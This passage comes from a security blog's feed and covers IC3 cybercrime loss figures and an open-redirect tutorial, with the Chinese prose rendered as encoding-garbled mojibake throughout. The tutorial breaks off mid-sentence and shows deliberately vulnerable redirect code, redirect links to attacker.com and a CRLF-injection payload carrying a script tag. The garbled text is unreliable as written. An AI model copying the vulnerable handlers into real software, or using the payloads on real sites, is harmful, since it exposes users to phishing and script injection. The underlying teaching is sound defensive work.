æäº¤èˆ‡ç¶²è·¯çŠ¯ç½ªæœ‰é—œçš„è³‡è¨Šï¼ŒIC3 åœ¨è—‰ç”±é€™äº›è³‡æ–™é€²è¡Œèª¿æŸ¥èˆ‡é€šçŸ¥ç›¸é—œåŸ·æ³•æ©Ÿæ§‹ã€‚</li>\n</ul>\n<h2 id=\"%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83\"><a class=\"direct-link\" href=\"#%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83\">#</a> åˆ†ææ¯”è¼ƒ</h2>\n<h3 id=\"1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report\"><a class=\"direct-link\" href=\"#1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report\">#</a> 1. åŸå§‹å ±å‘Š: IC3 Annual Report</h3>\n<p>IC3 çµ±è¨ˆäº†ç¶²è·¯çŠ¯ç½ªæ‰€é€ æˆçš„é‡‘é¡æå¤±ï¼Œä¸¦ä»¥çŠ¯ç½ªæ‰‹æ³•çš„æ–¹å¼ä¾†åˆ†é¡ã€‚<br>\n<img src=\"/img/posts/nick/cybersecurity-loss/cl_2.jpg\" alt=\"\"></p>\n<center style=\"font-size:14px;color:#C0C0C0;text-decoration:underline\">https://www.ic3.gov/Media/PDF/AnnualReport/2020_IC3Report.pdf</center>\n<br>\n<p>å¾é€™å¼µè¡¨æ ¼ä¸­æˆ‘å€‘å¯ä»¥çœ‹å‡ºå‰ä¸‰ååˆ†åˆ¥æ˜¯</p>\n<ol>\n<li><strong>BEC/EACï¼š</strong><br>\né€éé›»å­éƒµä»¶å°åŒ¯æ¬¾æˆ–ä»˜æ¬¾è³‡è¨Šé€²è¡Œè©é¨™ï¼Œä½¿è¢«å®³è€…åŒ¯éŒ¢åˆ°æ”»æ“Šè€…çš„å¸³æˆ¶ï¼ŒBEC æŒ‡çš„æ˜¯æ”»æ“Šå°è±¡ç‚ºå…¬å¸ï¼ŒEAC å‰‡æ˜¯é‡å°å€‹äººã€‚</li>\n<li><strong>Confidence Fraud/Romanceï¼š</strong><br>\nå‡è£æˆè¢«å®³è€…ä¿¡ä»»çš„å°è±¡ï¼Œè®“è¢«å®³è€…å‘æ”»æ“Šè€…ç™¼é€æœ‰åƒ¹å€¼çš„ç‰©å“æˆ–è³‡è¨Šã€‚</li>\n<li><strong>Investmentï¼š</strong><br>\nèª˜ä½¿è¢«å®³è€…æ ¹æ“šè™›å‡ä¿¡æ¯é€²ï¨ˆè³¼è²·ï¼Œé€šå¸¸ä»¥é«˜å ±é…¬ä½é¢¨éšªä¾†èª˜æ‹å—å®³è€…ã€‚</li>\n</ol>\n<p>æå¤±é‡‘é¡æœ€é«˜çš„ BEC/EAC èˆ‡é›»å­éƒµä»¶æœ‰æœ€é«˜çš„é—œè¯æ€§ï¼Œå¦‚æœè¦é é˜²è©²å•é¡Œå¿…é ˆè¦åœ¨éƒµä»¶ä¼ºæœå™¨ä¸Šåšè™•ç†ï¼Œæ¥ä¸‹ä¾†ä¾¿ä»¥å•é¡Œç™¼ç”Ÿé»ä¾†åˆ†æè³‡å®‰äº‹ä»¶å°è‡´çš„é‡‘èæå¤±</p>\n<h3 id=\"2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E\"><a class=\"direct-link\" href=\"#2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E\">#</a> 2. åˆ†æå ±å‘Š: å•é¡Œé»</h3>\n<p>é€™é‚Šå°‡è³‡å®‰å•é¡Œè—‰ç”±ç™¼ç”Ÿé»åˆ†ç‚ºå››é¡ï¼Œéƒ¨åˆ†è³‡å®‰äº‹ä»¶æœƒæœ‰ä¸€å€‹ä»¥ä¸Šçš„é¡å‹ã€‚<br>\n(ex. Phishing å¯èƒ½ç™¼ç”Ÿåœ¨æƒ¡æ„éƒµä»¶æˆ–é‡£é­šç¶²ç«™)</p>\n<ul>\n<li><strong>é›»å­éƒµä»¶</strong> : åœ¨æ”»æ“Šè€…èƒ½æˆåŠŸå¯„é›»å­éƒµä»¶çµ¦è¢«å®³è€…çš„ç‹€æ³ä¸‹å¯èƒ½ç™¼ç”Ÿçš„æ”»æ“Šã€‚</li>\n<li><strong>å¸³è™Ÿå¯†ç¢¼</strong> : æ”»æ“Šè€…çŸ¥é“è¢«å®³è€…çš„å¸³è™Ÿæˆ–å¯†ç¢¼å¾Œå¯èƒ½ç™¼ç”Ÿçš„æ”»æ“Šã€‚</li>\n<li><strong>ç¶²ç«™</strong> : æ”»æ“Šè€…å°è¢«å®³è€…ç¶²ç«™ç™¼å‹•æ”»æ“Šï¼Œæˆ–è€…åéä¾†èª˜å°è¢«å®³è€…é€£åˆ°æƒ¡æ„ç¶²ç«™ã€‚</li>\n<li><strong>ç¶²è·¯æœå‹™</strong> : åœ¨æ”»æ“Šè€…æ¥è§¸åˆ°è¢«å®³è€…å°å¤–é–‹æ”¾çš„æœå‹™(ex. FTP, SMB...)å¾Œå¯èƒ½ç™¼ç”Ÿçš„æ”»æ“Šã€‚</li>\n</ul>\n<img data-deopt=\"true\" src=\"/img/posts/nick/cybersecurity-loss/cl_3.jpg\">\n<p>æ‰€ä»¥æˆ‘å€‘å¯ä»¥å¾é€™å¼µåœ–çœ‹å‡ºï¼Œåœ¨ 2020 å¹´æœ‰è¶…éä¸€åŠçš„æå¤±æ˜¯ä¾†è‡ªé›»å­éƒµä»¶æœªåšå¥½ä¿è­·ï¼Œæå¤±ç¬¬äºŒé«˜çš„æ˜¯ä¾†è‡ªç¶²ç«™æ¼æ´ï¼Œå‰©ä¸‹çš„ä¸€æˆå‰‡æ˜¯ç”±å¸³è™Ÿå¯†ç¢¼å¤–æµèˆ‡å°å¤–é–‹æ”¾ç¶²è·¯æœå‹™çš„æ‰€å°è‡´ã€‚</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<img data-deopt=\"true\" src=\"/img/posts/nick/cybersecurity-loss/cl_4.jpg\">\n<p>æ¥è‘—åˆ†äº«ä¸€ä¸‹å¦‚æœè¦é‡é˜²å•é¡Œç™¼ç”Ÿè©²æ€éº¼åšã€‚</p>\n<ol>\n<li>\n<p><strong>é›»å­éƒµä»¶</strong> : 3240 million<br>\nè¦é é˜²èˆ‡é›»å­éƒµä»¶æœ‰é—œçš„è³‡å®‰å•é¡Œæœ‰å…©å€‹ä¸»è¦ç›®æ¨™ï¼Œç¬¬ä¸€æ˜¯é™ä½æ”¶åˆ°æƒ¡æ„éƒµä»¶çš„æ©Ÿæœƒï¼Œåšå¥½éƒµä»¶ä¼ºæœå™¨çš„è¨­å®šï¼Œæˆ–è€…ç›´æ¥é¸ç”¨é«˜å®‰å…¨æ€§çš„éƒµä»¶æœå‹™ï¼Œç¬¬äºŒæ˜¯é™åœ°æƒ¡æ„ä¿¡ä»¶çš„å½±éŸ¿ï¼Œå»ºè­°é€²è¡Œç¤¾äº¤å·¥ç¨‹æ¼”ç·´ï¼Œå¾ä¸­å­¸ç¿’æ”¶åˆ°å¯ç–‘éƒµä»¶çš„è™•ç†æµç¨‹ï¼Œé™ä½ç™¼ç”Ÿç‡è·Ÿå½±éŸ¿ä¹‹å¾Œï¼Œå®‰å…¨ç­‰ç´šè‡ªç„¶æœƒä¸Šå‡ã€‚</p>\n<p>å¦‚æœè¦åšéƒµä»¶ä¼ºæœå™¨çš„è¨­å®šï¼Œåˆä¸çŸ¥é“å¾ä½•é–‹å§‹ï¼Œå¯ä»¥åƒè€ƒæŠ€è¡“éƒ¨è½æ ¼çš„å¦ä¸€ç¯‡æ–‡ç« ã€‚<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€ŠåŸç†ç¯‡</a></p>\n</li>\n<li>\n<p><strong>ç¶²ç«™</strong> : 1749 million<br>\nè¦æå‡ç¶²ç«™çš„è³‡å®‰ç­‰ç´šå‰‡å»ºè­°å…ˆæª¢æŸ¥æœ‰æ²’æœ‰å¸¸è¦‹å•é¡Œï¼Œåƒæ˜¯ Owasp Top 10 æˆ–æ˜¯ Cwe Top 25ï¼Œè—‰ç”±å¢åŠ é§­å®¢çš„æ”»æ“Šæˆæœ¬ï¼Œé™ä½é§­å®¢å°è‡ªå®¶ç¶²ç«™çš„èˆˆè¶£ï¼Œæ¥è‘—ç­‰åˆ°æœ‰æ™‚é–“å’Œé ç®—å¾Œæ‰¾ç¬¬ä¸‰æ–¹å» å•†åšä¸€æ¬¡å®Œæ•´çš„æ»²é€æ¸¬è©¦ï¼Œç”±å°ˆæ¥­çš„è³‡å®‰åœ˜éšŠä¾†æª¢æŸ¥ç¶²ç«™æœ‰æ²’æœ‰å•é¡Œï¼Œé¿å…çƒå“¡å…¼è£åˆ¤å°è‡´ç–æ¼ã€‚</p>\n</li>\n<li>\n<p><strong>å¸³è™Ÿå¯†ç¢¼</strong> : 349 million<br>\nè¦ç¢ºä¿å¸³è™Ÿå¯†ç¢¼å®‰å…¨å‰‡æœ‰ä¸‰ä»¶äº‹è¦æ³¨æ„</p>\n<ol>\n<li>ä½¿ç”¨é«˜å¼·åº¦çš„å¯†ç¢¼ï¼Œé™ä½æš´åŠ›ç ´è§£å¯èƒ½æ€§</li>\n<li>å®šæœŸæ›´æ›å¯†ç¢¼ï¼Œç¸®çŸ­å¯†ç¢¼å¤–æµå¾Œæ”»æ“Šçš„æœ‰æ•ˆæ™‚é–“</li>\n<li>é¿å…åŒä¸€çµ„å¸³å¯†ç”¨åœ¨ä¸åŒçš„åœ°æ–¹ï¼Œæ¸›å°‘å¸³å¯†å¤–æµå¾Œçš„å½±éŸ¿ç¯„åœã€‚</li>\n</ol>\n<p>é€™é‚Šæ¨è–¦ä¸€å€‹ç¶²ç«™å¯ä»¥æŸ¥è©¢è‡ªå·±çš„å¸³è™Ÿå¯†ç¢¼æ˜¯å¦å·²ç¶“å¤–æµ<br>\n<a href=\"https://haveibeenpwned.com/\">have i been pwned?</a></p>\n</li>\n<li>\n<p><strong>ç¶²è·¯æœå‹™</strong> : 188 million<br>\nå…ˆæª¢æŸ¥è‡ªå·±çš„è¨­å‚™å°å¤–é–‹æ”¾äº†å“ªäº›æœå‹™ï¼Œåœ¨æª¢æŸ¥æœå‹™çš„ç‰ˆæœ¬ï¼Œæœ‰é€™å…©å€‹è³‡è¨Šå¾Œå°±å¯ä»¥åˆ° <a href=\"https://www.cvedetails.com/\">CVE Detail</a> æŸ¥è©¢æœå‹™çš„å¼±é»ï¼Œå¦‚æœæœ‰å¼±é»çš„è©±ç›¡å¿«å‡ç´šåˆ°å®‰å…¨çš„ç‰ˆæœ¬ï¼Œå¦‚æœæ²’è¾¦æ³•å‡ç´šï¼Œå¯ä»¥è€ƒæ…®åˆ©ç”¨ VPN å°‡é€™äº›å°å¤–æœå‹™è½‰æˆå°å…§æœå‹™ï¼Œé¿å…é§­å®¢æœ‰ç›´æ¥åˆ©ç”¨é€™äº›å¼±é»çš„æ©Ÿæœƒã€‚</p>\n</li>\n</ol>\n",
      "date_published": "2021-09-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/open-redirect/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/open-redirect/",
      "title": "åœ¨åšè·³è½‰åŠŸèƒ½æ™‚æ‡‰è©²æ³¨æ„çš„å•é¡Œï¼šOpen Redirect",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>åœ¨è¨±å¤šç¶²ç«™ä¸­éƒ½æœ‰å€‹å¾ˆå¸¸è¦‹çš„åŠŸèƒ½ï¼Œå°±æ˜¯é‡æ–°å°å‘ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœè¦è§€çœ‹çš„é é¢éœ€è¦æ¬Šé™ä½†æ˜¯ä½¿ç”¨è€…é‚„æ²’ç™»å…¥ï¼Œå°±æœƒå…ˆæŠŠä½¿ç”¨è€…å°å»ç™»å…¥é é¢ï¼Œç™»å…¥å®Œä¹‹å¾Œå†å°å›åŸæœ¬è¦å»çš„é é¢ã€‚</p>\n<!-- summary -->\n<p>ä¾‹å¦‚èªªä»Šå¤©æœ‰å€‹ç¤¾ç¾¤ç¶²ç«™ï¼Œæƒ³è¦çœ‹å€‹äººæª”æ¡ˆçš„è©±éœ€è¦ç™»å…¥ï¼Œè€Œå°æ˜çš„å€‹äººæª”æ¡ˆç¶²å€æ˜¯ï¼š<code>https://example.com/profile/ming</code>ï¼Œé‚£æˆ‘èº«ç‚ºä¸€å€‹è¨ªå®¢ï¼Œé»é€²å»ä¹‹å¾Œå°±æœƒè·³è½‰åˆ°ç™»å…¥é é¢ï¼Œä¸¦ä¸”å¸¶ä¸Šæˆ‘åŸæœ¬è¦å»çš„ç¶²å€ç•¶ä½œåƒæ•¸ï¼š<br>\n<code>https://example.com/login?redirect=https://example.com/profile/ming</code></p>\n<p>ç™»å…¥æˆåŠŸä¹‹å¾Œï¼Œç¶²ç«™å°±æœƒæ ¹æ“š <code>redirect</code> çš„å€¼ï¼ŒæŠŠæˆ‘å°å»åŸæœ¬è¦å‰å¾€çš„é é¢ã€‚</p>\n<p>é›–ç„¶çœ‹èµ·ä¾†æ˜¯å€‹å°åŠŸèƒ½ï¼Œä½†å…¶å¯¦èƒŒå¾Œæœ‰ä¸å°‘å®‰å…¨æ€§çš„å•é¡Œè¦è€ƒæ…®ã€‚</p>\n<h2 id=\"%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E4%BB%80%E9%BA%BC%E6%98%AF-open-redirect%EF%BC%9F\">#</a> ä»€éº¼æ˜¯ open redirectï¼Ÿ</h2>\n<p>Open redirectï¼Œä¸­æ–‡é€šå¸¸ç¿»ä½œé–‹æ”¾å¼é‡å®šå‘æˆ–æ˜¯å…¬é–‹é‡å®šå‘ä¹‹é¡çš„ï¼Œä½†æˆ‘è‡ªå·±å–œæ­¡ç¿»æˆï¼šã€Œä»»æ„é‡æ–°å°å‘ã€ï¼Œè¦ºå¾—æ¯”è¼ƒè²¼è¿‘åŸæ„ï¼Œå°±æ˜¯å¯ä»¥é‡æ–°å°å‘åˆ°ä»»æ„ç›®çš„åœ°ã€‚</p>\n<p>ä»¥æ–‡ç« é–‹é ­çš„ä¾‹å­ä¾†èªªï¼Œæ”»æ“Šè€…å…¶å¯¦å¯ä»¥åœ¨ URL ä¸Šé¢å¸¶ä»»ä½•å€¼ï¼Œä¾‹å¦‚èªªï¼š<code>https://attacker.com</code>ï¼Œé€™æ¨£ä½¿ç”¨è€…åœ¨ç™»å…¥ä¹‹å¾Œï¼Œå°±æœƒè·³è½‰åˆ°é€™å€‹é é¢ã€‚</p>\n<p>åƒé€™å€‹å°±æ˜¯éœ€è¦ä½¿ç”¨è€…æ“ä½œï¼ˆç™»å…¥ï¼‰æ‰èƒ½è§¸ç™¼é‡æ–°å°å‘ï¼Œä½†æœ‰äº›åŠŸèƒ½ç„¡éœ€ä½¿ç”¨è€…æ“ä½œï¼Œå¯èƒ½å°±æœ‰è‘—é‡æ–°å°å‘çš„åŠŸèƒ½ã€‚ä»¥ç™»å…¥çš„é€™å€‹ä¾‹å­ä¾†èªªï¼Œå‡è¨­ä½¿ç”¨è€…å·²ç¶“ç™»å…¥äº†ï¼Œé‚£ <code>https://example.com/login?redirect=https://attacker.com</code> é€™å€‹é€£çµé»ä¸‹å»ä¹‹å¾Œï¼Œç³»çµ±åµæ¸¬åˆ°å·²ç¶“ç™»å…¥ï¼Œå°±æœƒç›´æ¥æŠŠä½¿ç”¨è€…è½‰åˆ° <code>https://attacker.com</code>ã€‚</p>\n<p>é€™é€ æˆçš„çµæœæ˜¯ä»€éº¼å‘¢ï¼Ÿ</p>\n<p>ä½¿ç”¨è€…é»äº†ä¸€å€‹ <a href=\"http://example.com\">example.com</a> çš„é€£çµï¼Œå»åœ¨ç„¡æ„é–“è¢«è½‰åˆ° <a href=\"http://attacker.com\">attacker.com</a> å»ã€‚é€™ç¨®å¯ä»¥ç›´æ¥æŠŠä½¿ç”¨è€…å°åˆ°ä»»æ„åœ°æ–¹å»çš„æ¼æ´ï¼Œå°±å«åš open redirectã€‚</p>\n<h2 id=\"open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F\"><a class=\"direct-link\" href=\"#open-redirect-%E8%83%BD%E9%80%A0%E6%88%90%E4%BB%80%E9%BA%BC%E5%95%8F%E9%A1%8C%EF%BC%9F\">#</a> Open redirect èƒ½é€ æˆä»€éº¼å•é¡Œï¼Ÿ</h2>\n<p>ä¸€å€‹æœ€ç›´è¦ºèƒ½æƒ³åˆ°çš„æ”»æ“Šæ–¹å¼ï¼Œå¤§æ¦‚å°±æ˜¯é‡£é­šç¶²ç«™äº†ã€‚åœ¨è¬›æ”»æ“Šæ‰‹æ³•çš„æ™‚å€™ï¼Œæˆ‘è¦ºå¾—ã€Œæƒ…å¢ƒã€æ˜¯ä¸€å€‹æ»¿é‡è¦çš„å› ç´ ï¼Œæœ‰äº›çœ‹ä¼¼æ²’ä»€éº¼çš„æ”»æ“Šï¼Œåœ¨æ­é…é©ç•¶çš„æƒ…å¢ƒä¹‹å¾Œï¼Œä½ æœƒè¦ºå¾—ã€Œå“‡ï¼Œå¥½åƒæ»¿å®¹æ˜“æˆåŠŸçš„ã€ã€‚</p>\n<p>åœ¨çœ‹å¾—åˆ°ç¶²å€çš„ç‹€æ³ä¸‹ï¼Œä½ çœ‹åˆ°é™Œç”Ÿçš„ç¶²å€å°±æœƒæ¯”è¼ƒå°å¿ƒç¿¼ç¿¼ï¼Œå› ç‚ºä½ çŸ¥é“å¯èƒ½æœƒæ˜¯è©é¨™æˆ–æ˜¯é‡£é­šç¶²ç«™ï¼›ä½†è‹¥æ˜¯çœ‹åˆ°ç†Ÿæ‚‰çš„ç¶²å€ï¼Œæœƒæ”¾é¬†ä¸€äº›æˆ’å¿ƒï¼š</p>\n<p><img src=\"/img/posts/huli/open-redirect/chat.png\" alt=\"\"></p>\n<p>åœ–ä¸Šçš„ç¶²å€æœ€å¾Œé‚£æ®µå…¶å¯¦æ˜¯ <a href=\"https://attacker.com\">https://attacker.com</a> url encode éçš„çµæœï¼Œæ‰€ä»¥ä½¿ç”¨è€…æ ¹æœ¬ä¸æœƒæ³¨æ„åˆ°å¾Œé¢é‚£ä¸²ï¼Œåªæœƒçœ‹åˆ°å‰é¢æ˜¯ç”± <a href=\"http://facebookb.com\">facebookb.com</a> é–‹é ­ï¼Œé€™é‚Šæˆ‘æƒ³å¼·èª¿çš„äº‹æƒ…æ˜¯ã€Œçœ‹åˆ°ç†Ÿæ‚‰çš„ç¶²å€ï¼Œä½¿ç”¨è€…æœƒæ¯”è¼ƒæ²’æœ‰æˆ’å¿ƒã€ã€‚</p>\n<p>ä½†é€™æ¨£å­çš„æƒ…å¢ƒï¼Œå…¶å¯¦å¾ˆé¡ä¼¼çš„ç¶²å€ä¹Ÿå¯ä»¥é”æˆå·®ä¸å¤šçš„äº‹æƒ…ï¼ˆåªæ˜¯æ•ˆåŠ›æ¯”è¼ƒä½ï¼‰ï¼Œä¾‹å¦‚èªª <a href=\"http://facebo0k.com\">facebo0k.com</a> æˆ–æ˜¯ <a href=\"http://myfacebook.com\">myfacebook.com</a> ä¹‹é¡çš„ã€‚</p>\n<p>é€™æ™‚å€™å¯ä»¥å†è¨­æƒ³å¦å¤–ä¸€å€‹æƒ…å¢ƒï¼Œå°±æ˜¯æœ‰äº›ç¶²ç«™ç•¶ä½ é»æ“Šå¤–éƒ¨é€£çµçš„æ™‚å€™ï¼Œæœƒæé†’ä½ èªªï¼šã€Œä½ è¦é€£åˆ°å¤–éƒ¨ç¶²ç«™äº†å–”ï¼Œè¦å°å¿ƒå–”ã€ï¼Œé€™æ™‚å€™å¦‚æœåˆ©ç”¨ open redirect çš„è©±ï¼Œç¶²ç«™å¯èƒ½å°±ä¸æœƒè·³å‡ºæç¤ºï¼ˆå› ç‚ºæ˜¯åŒä¸€å€‹ç¶²åŸŸï¼‰ï¼Œä½¿ç”¨è€…æˆ–è¨±å°±åœ¨ç„¡æ„ä¹‹é–“è·³åˆ°äº†åˆ¥çš„ç¶²ç«™è€Œä¸è‡ªçŸ¥ã€‚</p>\n<p>ä¾‹å¦‚èªªä»Šå¤©æœ‰å€‹è«–å£‡å¥½äº†ï¼Œæœ‰å€‹åœ°æ–¹æœ‰ open redirect çš„æ¼æ´ï¼Œç„¶å¾Œæˆ‘åœ¨æ–‡ç« è£¡é¢æ”¾äº†ä¸€å€‹é€£çµï¼Œåˆ©ç”¨ open redirect è®“è·³å»å¤–éƒ¨ç¶²ç«™çš„æç¤ºå¤±æ•ˆï¼Œè€Œä½¿ç”¨è€…é»äº†é€£çµä¹‹å¾Œæœƒåˆ°ã€Œç²¾å¿ƒè¨­è¨ˆçš„é‡£é­šç¶²ç«™ã€ï¼Œä»‹é¢é•·å¾—ä¸€æ¨¡ä¸€æ¨£ï¼Œä½†æ˜¯è·³å‡ºå€‹è¦è¼¸å…¥å¸³è™Ÿå¯†ç¢¼çš„ popup è·Ÿä½ èªªä½ çš„é€£ç·šéšæ®µå·²éæœŸï¼Œè«‹é‡æ–°ç™»å…¥ã€‚é€™æ™‚ä½¿ç”¨è€…å°±æœ‰æ¯”è¼ƒé«˜çš„æ©Ÿç‡æœƒå»è¼¸å…¥å¸³è™Ÿå¯†ç¢¼ï¼Œå› ç‚ºæ²’æœ‰æƒ³åˆ°è‡ªå·±è¢«è·³è½‰åˆ°é‡£é­šç¶²ç«™ã€‚</p>\n<p>ä»¥ä¸Šé€™äº›å•é¡Œï¼Œéƒ½åªæ˜¯åœ¨è¨è«– open redirect ã€Œä¸è·Ÿå…¶ä»–æ¼æ´çµåˆã€çš„ç‹€æ³ä¸‹ï¼Œå¯ä»¥é€ æˆå“ªäº›å±å®³ï¼Œè½èµ·ä¾†å¥½åƒé‚„å¥½å°å§ï¼Ÿè·Ÿå…¶ä»–æ”»æ“Šæ¯”èµ·ä¾†ä¼¼ä¹æ²’ä»€éº¼ï¼Œä½†æ˜¯ open redirect è¢«ä½ä¼°çš„åœ°æ–¹ï¼Œå…¶å¯¦æ˜¯åœ¨å®ƒèˆ‡å…¶ä»–æ¼æ´çš„çµåˆä¹‹å¾Œï¼Œå¯ä»¥ç™¼æ®å‡ºçš„å¨åŠ›ã€‚</p>\n<p>åœ¨ç¹¼çºŒå¾€ä¸‹ä¹‹å‰ï¼Œæˆ‘å€‘å¿…é ˆå…ˆäº†è§£ä¸€ä¸‹é‡æ–°å°å‘çš„å¯¦ä½œï¼Œä¸»è¦åˆ†ç‚ºå…©ç¨®ï¼š</p>\n<ol>\n<li>å¾Œç«¯é‡æ–°å°å‘ï¼Œé€é response header <code>Location</code></li>\n<li>å‰ç«¯é‡æ–°å°å‘ï¼Œå¯èƒ½é€é history.push æˆ–æ˜¯ window.open ä»¥åŠ location ç­‰ç­‰</li>\n</ol>\n<p>ç¬¬ä¸€ç¨®é€éå¾Œç«¯ä¾†åš redirectï¼Œæ˜¯é  server å›å‚³ <code>Location</code> é€™å€‹ headerï¼Œç€è¦½å™¨å°±æœƒæŠŠä½¿ç”¨è€…å°åˆ°ç›¸å°æ‡‰çš„åœ°æ–¹å»ã€‚å¯¦ä½œä¸Šå¯èƒ½æœƒåƒæ˜¯é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">handler</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  res<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token number\">302</span><span class=\"token punctuation\">)</span><br>  res<span class=\"token punctuation\">.</span><span class=\"token function\">setHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Location: '</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>redirect<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">return</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>è€Œç¬¬äºŒç¨®ç”±å‰ç«¯å¯¦ä½œçš„å°±ä¸å¤ªä¸€æ¨£äº†ï¼Œä¸€å€‹å¸¸è¦‹çš„ç¯„ä¾‹æ˜¯ç›´æ¥æŠŠè¦å»çš„åœ°æ–¹ assign çµ¦ <code>window.location</code> åšé é¢è·³è½‰ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> searchParams <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><br>window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> searchParams<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'redirect'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>æˆ–å¦‚æœæ˜¯ SPA ä¸æƒ³æ›é çš„è©±ï¼Œå¯èƒ½æœƒç›´æ¥ç”¨ <code>history.push</code> æˆ–æ˜¯æ¡†æ¶å…§å»ºçš„ router.pushã€‚</p>\n<p>è€Œç„¡è«–æ˜¯å‰ç«¯é‚„æ˜¯å¾Œç«¯ä¾†åšé‡æ–°å°å‘ï¼Œå…‰æ˜¯å¯¦ä½œæ–¹å¼éƒ½æœ‰å„è‡ªçš„å•é¡Œéœ€è¦è™•ç†ã€‚</p>\n<h2 id=\"%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection\"><a class=\"direct-link\" href=\"#%E5%BE%8C%E7%AB%AF%EF%BC%9Acrlf-injection\">#</a> å¾Œç«¯ï¼šCRLF injection</h2>\n<p>å¾Œç«¯çš„é‡æ–°å°å‘ä¸­ï¼ŒæœƒæŠŠå‚³éä¾†çš„å€¼å¡åˆ° <code>Location</code> é€™å€‹ response header è£¡é¢ã€‚æœ‰äº› server æˆ–æ˜¯ framework å¦‚æœæ²’æœ‰è™•ç†å¥½çš„è©±ï¼Œå¯ä»¥å¡å…¥æ›è¡Œå­—å…ƒï¼Œä¾‹å¦‚èªªæŠŠé‡æ–°å°å‘çš„ç¶²å€è¨­å®šç‚º <code>abc\\ntest:123</code>ï¼Œæœ‰å¯èƒ½ response å°±è®Šæˆï¼š</p>\n<pre><code>HTTP/2 302 Found\nLocation: abc\ntest:123\n</code></pre>\n<p>é‚£è‹¥æ˜¯æ”¹æˆï¼š<code>abc\\n\\n&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œresponse å°±æœƒè®Šæˆï¼š</p>\n<pre><code>HTTP/2 302 Found\nLocation: abc\n\n&lt;script&gt;alert(1)&lt;/script&gt;\n....\n</code></pre>\n<p>è—‰ç”± CRLF injection å»æ”¹è®Š response body çš„å…§å®¹ï¼Œä½†å¾ˆéºæ†¾ä¼¼ä¹ç„¡æ³•ç›´æ¥é”æˆ XSSï¼Œå› ç‚ºç€è¦½å™¨çœ‹åˆ° status code æ˜¯ 301/302 æ™‚æœƒå¿½ç•¥ response bodyï¼Œç›´æ¥æŠŠä½¿ç”¨è€…å°å»ç›®æ¨™é é¢ã€‚</p>\n<p>æˆ‘æ‰¾åˆ°å¯ä»¥é‹ä½œçš„è³‡æ–™éƒ½å·²ç¶“æ˜¯å››äº”å¹´å‰çš„äº†ï¼š</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/192667\">[stagecafrstore.starbucks.com] CRLF Injection, XSS</a></li>\n<li><a href=\"https://hackerone.com/reports/260744\">[dev.twitter.com] XSS and Open Redirect</a></li>\n</ol>\n<p>æˆ‘è¨˜å¾—æˆ‘å¥½åƒçœ‹éæœ‰ç¯‡æ–‡ç« åœ¨è¬›é€™ç¨®æƒ…æ³æ‡‰è©²æ€éº¼è¾¦ï¼Œä½†æˆ‘æ‰¾å¾ˆä¹…éƒ½æ‰¾ä¸åˆ°ï¼Œå¦‚æœçŸ¥é“è©²æ€éº¼ç¹éçš„è«‹å‘Šè¨´æˆ‘ã€‚</p>\n<p>ä¸éå°±ç®—æ”¹è®Š response body æ²’ä»€éº¼ç”¨ï¼Œæ”¹è®Šå…¶ä»–çš„ header ä¹Ÿå¯èƒ½ä¸²è¯å…¶ä»–æ”»æ“Šï¼Œä¾‹å¦‚èªª Set-Cookieï¼Œå¯ä»¥å¹«ä½¿ç”¨è€…è¨­ç½®ä»»æ„ cookieï¼Œå°±æœ‰æ©Ÿæœƒå†ä¸²æ¥ session fixation æˆ–æ˜¯ CSRF ä¹‹é¡çš„æ”»æ“Šã€‚</p>\n<h2 id=\"%E5%89%8D%E7%AB%AF%EF%BC%9Axss\"><a class=\"direct-link\" href=\"#%E5%89%8D%E7%AB%AF%EF%BC%9Axss\">#</a> å‰ç«¯ï¼šXSS</h2>\n<p>å¦‚æœæ˜¯å‰ç«¯å¯¦ä½œçš„é‡æ–°å°å‘ï¼Œè¦ç‰¹åˆ¥æ³¨æ„çš„ä¸€å€‹å•é¡Œå°±æ˜¯ XSSã€‚</p>\n<p>ä½ 